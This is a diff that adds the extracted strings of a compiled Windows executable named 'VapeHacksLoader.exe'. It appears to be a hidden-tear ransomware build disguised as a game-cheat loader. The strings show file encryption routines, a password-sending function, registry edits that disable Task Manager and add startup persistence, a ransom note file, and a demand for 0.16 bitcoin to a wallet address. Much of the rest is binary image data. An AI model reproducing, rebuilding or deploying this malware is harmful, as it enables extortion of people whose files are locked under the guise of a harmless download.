@@ -1,0 +1,802 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+p"33#A
+v4.0.30319
+#Strings
+IEnumerable`1
+label1
+button1
+pictureBox1
+textBox1
+Microsoft.Win32
+label2
+DD5783BCF1E9002BC00AD5B83A95ED6E4EBB4AD5
+SHA256
+get_UTF8
+<Module>
+<PrivateImplementationDetails>
+System.IO
+set_IV
+mscorlib
+System.Collections.Generic
+Form1_Load
+add_Load
+get_Red
+RijndaelManaged
+textBox1_TextChanged
+add_TextChanged
+get_Untitled
+bytesToBeEncrypted
+Synchronized
+Append
+SendPassword
+CreatePassword
+password
+defaultInstance
+set_Mode
+set_AutoScaleMode
+set_SizeMode
+PictureBoxSizeMode
+CryptoStreamMode
+CipherMode
+set_Image
+Enumerable
+IDisposable
+set_Visible
+RuntimeFieldHandle
+RuntimeTypeHandle
+GetTypeFromHandle
+EncryptFile
+set_FormBorderStyle
+FontStyle
+set_Name
+get_MachineName
+get_UserName
+userName
+computerName
+set_Multiline
+System.Core
+get_Culture
+set_Culture
+resourceCulture
+ButtonBase
+ApplicationSettingsBase
+TextBoxBase
+Dispose
+Create
+EditorBrowsableState
+get_White
+STAThreadAttribute
+CompilerGeneratedAttribute
+GuidAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+DeleteValue
+GetValue
+SetValue
+VapeHacksLoader.exe
+set_Size
+get_BlockSize
+set_BlockSize
+set_AutoSize
+set_ClientSize
+get_KeySize
+set_KeySize
+ISupportInitialize
+Padding
+Encoding
+System.Runtime.Versioning
+ToString
+GetString
+disposing
+System.Drawing
+ShowDialog
+ComputeHash
+get_ExecutablePath
+get_Length
+length
+get_Black
+button1_Click
+add_Click
+System.ComponentModel
+ContainerControl
+CryptoStream
+MemoryStream
+Program
+System
+SymmetricAlgorithm
+HashAlgorithm
+Random
+ICryptoTransform
+resourceMan
+set_Margin
+set_Icon
+set_ShowIcon
+GetExtension
+Application
+set_Location
+location
+System.Configuration
+System.Globalization
+startAction
+System.Reflection
+ControlCollection
+set_StartPosition
+FormStartPosition
+Button
+Form_Shown
+CultureInfo
+Bitmap
+set_TabStop
+System.Linq
+set_ShowInTaskbar
+hidden_tear
+VapeHacksLoader
+StringBuilder
+sender
+get_ResourceManager
+ComponentResourceManager
+EventHandler
+System.CodeDom.Compiler
+IContainer
+CurrentUser
+userDir
+set_ForeColor
+set_BackColor
+set_UseVisualStyleBackColor
+messageCreator
+.cctor
+CreateEncryptor
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+System.Resources
+hidden_tear.Form1.resources
+hidden_tear.Form2.resources
+hidden_tear.Form3.resources
+hidden_tear.Properties.Resources.resources
+DebuggingModes
+GetDirectories
+hidden_tear.Properties
+GetFiles
+EnableVisualStyles
+WriteAllLines
+passwordBytes
+Rfc2898DeriveBytes
+ReadAllBytes
+WriteAllBytes
+GetBytes
+Settings
+EventArgs
+get_Controls
+System.Windows.Forms
+Contains
+set_AutoScaleDimensions
+get_Chars
+RuntimeHelpers
+components
+Concat
+GetObject
+EndInit
+BeginInit
+GraphicsUnit
+get_Default
+SetCompatibleTextRenderingDefault
+DialogResult
+Environment
+InitializeComponent
+set_Font
+AES_Encrypt
+SuspendLayout
+ResumeLayout
+PerformLayout
+System.Text
+set_Text
+set_TabIndex
+MessageBox
+PictureBox
+set_MinimizeBox
+set_ControlBox
+TextBox
+get_Bitcoin_Accepted_Here_4800px
+InitializeArray
+ToArray
+set_Key
+CreateSubKey
+OpenSubKey
+RegistryKey
+System.Security.Cryptography
+get_Assembly
+set_ReadOnly
+encryptDirectory
+Registry
+set_Opacity
+WrapNonExceptionThrows
+Loader
+Loader-Private
+Copyright 
+  2017
+$7ab0dd04-43e0-4d89-be59-60a30b766467
+1.0.0.0
+.NETFramework,Version=v4.5
+FrameworkDisplayName
+.NET Framework 4.5
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+15.1.0.0
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Icon
+IconData
+IconSize
+System.Drawing.Size
+System.Drawing.Size
+height
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP/
+Your Files are locked. They are locked because you downloaded something with this file in it.
+This is Ransomware. It locks your files until you pay for them. Before you ask, Yes we will
+give you your files back once you pay and our server confrim that you pay.
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD:
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+tEXtSoftware
+www.inkscape.org
+IDATx^
+'=!=5=+
+kzQzYzMzc
+ax-wM7IWO+
+LOO/MoNH
+\z_zSzqzZ
+ezt: }(}7]
+vK7KwL
+tz:!}:
+]7=9}"
+]rJz{zp
+S'"vLwJ
+vz~:1U5u
+`:}'=2
+?IOJ[6
+9bEzr:}t
+,"vHwH
+Sz{Z;:K
+{ze:=U
+czKZ3:;@
+Zzi:#U
+]zf:9UMK
+@D\#}sT
+islzxZY
+aM:(m[
+d~~B#_
+0E27?m,W
+~oEzAZ
+mtIzzu>
+e^~^#O
+4r40YW
+@{}4m[
+e^>g,O
+t`:$}/
+tt:+Uk
+""n0V{
+~XzazO:>
+"]4*8B
+CyVxLZ7vv
+Xn_M;U
+w[XXuQn
+&%"n?V
+si: mS
+z:zl}A
+#pvzJZQ
+tYD\'}n
+_WEOh
+l9-==m]=_
+I/K_Ng
+-F,ZL]1
+m7MkiM
+'z[U6=
+{|6|2|4|0
+;ysxq(
+3a9?#)
+sxTxnxS(
+!<;| |%
+SBy(Qv
+`u|):j
+2@WDt
+ex[85d
+uxg8=d
+)?W}]X?
+.fy(G:/1
+fEQlSy
+msyxQ6
+)zBy/v
+r^X/ZN
+}o:^M2
+^?| \3
+4EQlSy
+_`yDM^P
+'0."G
+m$]?CS
+gEQ\Py
+h$E[br
+_{R:^4
+FW4:f'
+x*7Q<=
+O`]D^m
+koXJEQ
+GwEN<>LUr
+rXHEQ|
+XC{GGI
+0."Go
+gO?p8w
+EQ\PyH
+1`9D>n
+UyKvOQ
+7CyPDy
+TTTl?;*
+uB.k@t
+`dZ2U6
+1`^)S_1
+@QLY%M[C
+`)+|/
+"{L&x=
+'`n)CKu
+|.G@d'{=
+<uwZ?|
+9Qvn5Y
+;PE+x]
+7z=Au)
+zQnN39
++P5Ofo
+"P>/0y
+@d7x=@l
+"{\&x]
+.P%'do
+rsK.G@d
+zQn^er
+i?r]Z?pM7;
+&G@d|`+JE
+/O/Bmp`W
+*&y}@L
+cA7hgs
+XZ?l}7
+LZ>m^=
+aSnV79
+?in<P5O
+f*Emp`K
+f*Emp`
+3z0S)j
+2@tkz]
+`nLZ.M
+zQnv39
+an=P%;z
+P%+y=@
+@T;{]@
+M]P5;y]
+zQnN19
+@tky]@\
+0Cmp`c
+~k?te7
+z=@qig
+_6NkSVy
+S{2M[C
+xh?r]7
+LkSVu3
+1@t[{]
+V&G@d'{=
+zfo@t_
+Xk?te7
+fo@t+y]
+zQnn09
+LkSVus
+vfg@to
+YK&z=@1h?
+VZ?t]7
+'f_@dmY
+k&G@d'z=
+OFy%I2h
+;4m?pi
+</8EU|
+fO@t;z]
+n=!m^{`
+"{\&x]
+fO@dwz=@l
+D1 4YI2d
+ J='}<
+7dD>mn
+>eY6!8
+<{QFYY
+_k/X,V
+eY6Z^+
+2vp)s@
+Dn@xka
+. eu+'
+>=|b\
+dYvwp2
+@Uin}0
+S\8zO)O
+dYvTp"
+E=3J^.
+xP \Ro_
+P\,zU+
+'`zdYvep2
+o)FGdY6>8
+)zEx1"
+zfa)^Ri
+<x`nDg5
+h u;ZY
+aN"%7Z9
+S<dnM+
+~|?$@u^2
+E=3J^,
+02x{jBTo
+`$eYvwp2
+IDATFVq
+dYvep2
+@Uin-,
+iS_,)<X
+Pm{X9FZ
+X}XeGX
+?Zbx#9
+Ej~me!%
+K5_@~,
+Y9W~"
+eyY]>'
+eeE)nH/n
+yA/G0t
+nq|'S0d
+q\'C0t
+n//0d?
+yC'C0t
+";96Wk
+29K|vv
+U{G`m4
+k/>dl~Vu
+29W|nv
+Z/G0d'
+epB<:6U{
+lIrsX/G0dG
+H/C0t
+A`qLW&
+A`1MW&W
+v/C0to
+9X]zs
+_<!~9{
+Zj/Z|E
+=r\Ts!
+l.}j|=
+If<W33,
+k&;;CT{
+oH|{\7v
+x]\-vT
+n=ozqX
+8|xS5;l
+9:+8*
+|ONQee
+pl|6.\u
+LMn8:~
+q/n_ee>
+M|w4;l
+jv6G:p
+l^D3gg
+jrOmxc
+Qf9Y|vk
+dWolv7
+~egOjv
+_GooB\
+]@yTnX
+Yf:U3c
+Wt%}<a|k
+EONQe^W
+e\{VYa
+lUVV';xH
+uPx37GK
+>Uee9r
+8zQS/^We=.
+dW_hv7
+;Qu~*W
+U^6G:p`
+xQ k!]
+lMdW_kv7
+VUV6G:
+S;<NRe
+9UNV+{x@
+|:fuIS
+`g^Pui
+`g.Pui
+{VY9vr
+y#IDAT3
+>xbl#?
+$3>k43
+8w\,.
+$3>a43
+r{]N@hs
+^8Y&s]D\
+e./P*u~
+W./P*u
+YF<$oC
+e]^ *u
+_UUg%7
+N{8D^m
+DQ<'p
+ez^~+_
+8S_FJ}H
+kdYV8l
+d#Y]>-
+7B^jt1
+(:y80
+r.7zG{
+W\^ *uv
+]\^ *uv
+Dk\1Ys$w
+FGhV{%
+k\^ *u
+u?2e>;YC$[
+Dk\<Ys
+32e^-YC4
+q#P4_s
+FO#xYF
+MUU;&7
+:zD{{k
+F_#{\fvk
+Bo{Afr
+V.+zG{~e2
+6UUufr
+@&UUM*
+T.7PS?
+fuf2; 
+~>P.Uw
+`0UUupr
+N<DJ9y
+`BTUuIrSG$O
+G]WzM?
+EUUg&7rDR
+QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
+System.Drawing.Bitmap
+|IDATx^
+oi@{X0
+gENVhfv
+HgXVAYX\
+'X2X4D2
+L@T(de
++"K49=
+">@PD!
+feDVCn
+yy-m3v
+(w_E
+sDFLDDJ
+W_MW^y%
+vM0JxL
+E"T2,'q<
+FeDDD8
+aFWGXFn
+,&{h;K
+^C&\ROLLh,
+ &"$,#
+H}9" \
+A@L4T@
+Nt)& i
+5b^eBj
+y^D!ok
+d_ECD 
+q^DCr&
+#WBDPD@
+G%"emq
+,R;+ 
+cT b^)
+T<XDL@
+D $?L.
+KX>`O1
+|#I6J*I0
+Nt)& C
+,NDA(E#
+O.Fr[]>
+Nt)& #/Bw
+/$EVA  
+k,li
+qI0"A"
+V;X6B.
+B2<LHtu$
+-UQ:rL@
+i)qLx]~
+z;G/Bo
+V8xB_k
+G%!'kM
+.E&E29
+T6x2^k;
+CV4L@4
+2?E;O{ }
+R>T&L2
+U($nI)
+eq.'Q`R[s
+g>CW\q
+2w(Cd o7"
+:IEV[\
+R$tR%
+s)V=,W
+*QJL"J
+k-cx"_
+!"auNZ
+mL}|6F^
+kmGT ,
+k'D<D(
+CVAL,j
+VqHrQo
+CNW&tr/
+/_>O_|
+WAT0L:r2
+J6B\!9
+`(<qOd
+vum)",25
+mXnnH<xL
+wVBLFB
+}AZ86T&
+y{H4ZP
+sL9VkO@
+IHdH.Z
+O>YP85
+]l.q6V
+H!(IDT
+sC+#Q6<
+Hul-ob
+!o3*"Q*
+Q Z2rlk
+n5$"Y\R
+Q0JL<t
+e}AJdL
+C_K^S^
+1w0ex
+DS.p~9#
+}/7:!_
+7zA&?m
+x3ODF!
+'0mWFe
+]NYfw
+mQ_)[oA
+bWI>~P
+RSDSgPTO
+C:\Users\Tyler\Desktop\hidden-tear-master\hidden-tear\hidden-tear\obj\Debug\VapeHacksLoader.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="utf-8"?>
+<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <!-- UAC Manifest Options
+             If you want to change the Windows User Account Control level replace the 
+             requestedExecutionLevel node with one of the following.
+        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
+        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
+        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />
+            Specifying requestedExecutionLevel element will disable file and registry virtualization. 
+            Remove this element if your application requires this virtualization for backwards
+            compatibility.
+        -->
+        <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application>
+      <!-- A list of the Windows versions that this application has been tested on and is
+           is designed to work with. Uncomment the appropriate elements and Windows will 
+           automatically selected the most compatible environment. -->
+      <!-- Windows Vista -->
+      <!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />-->
+      <!-- Windows 7 -->
+      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />-->
+      <!-- Windows 8 -->
+      <!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />-->
+      <!-- Windows 8.1 -->
+      <!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />-->
+      <!-- Windows 10 -->
+      <!--<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />-->
+    </application>
+  </compatibility>
+  <!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher
+       DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need 
+       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should 
+       also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config. -->
+  <!--
+  <application xmlns="urn:schemas-microsoft-com:asm.v3">
+    <windowsSettings>
+      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
+    </windowsSettings>
+  </application>
+  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->
+  <!--
+  <dependency>
+    <dependentAssembly>
+      <assemblyIdentity
+          type="win32"
+          name="Microsoft.Windows.Common-Controls"
+          version="6.0.0.0"
+          processorArchitecture="*"
+          publicKeyToken="6595b64144ccf1df"
+          language="*"
+        />
+    </dependentAssembly>
+  </dependency>
+</assembly>
+C:\Users\
+Software\Microsoft\Windows\CurrentVersion\Policies\System
+DisableTaskMgr
+Control Panel\Desktop
+Wallpaper
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/
+.WINDOWS
+\Desktop\
+\Desktop\READ_IT.txt
+Your files have been encrypted.
+Read the Program for more information
+read program for more information.
+Microsoft Sans Serif
+label1
+Your computer is locked. Please do not close this window as that will result in serious computer damage.
+label2
+Click next for more information and payment on how to get your files back.
+button1
+pictureBox1
+$this.Icon
+textBox1
+textBox1.Text
+Checking Payment.................Please Wait
+Please wait
+Your Payment has failed, The funs have been sent back to your wallet. Please send it again
+1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M
+Send 0.16 to the address below.
+I paid, Now give me back my files.
+hidden_tear.Properties.Resources
+Bitcoin_Accepted_Here-4800px
+Untitled
+$this.Icon
+textBox1.Text
+Bitcoin_Accepted_Here-4800px
+Untitled
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+Loader
+FileVersion
+1.0.0.0
+InternalName
+VapeHacksLoader.exe
+LegalCopyright
+Copyright 
+  2017
+LegalTrademarks
+OriginalFilename
+VapeHacksLoader.exe
+ProductName
+Loader-Private
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
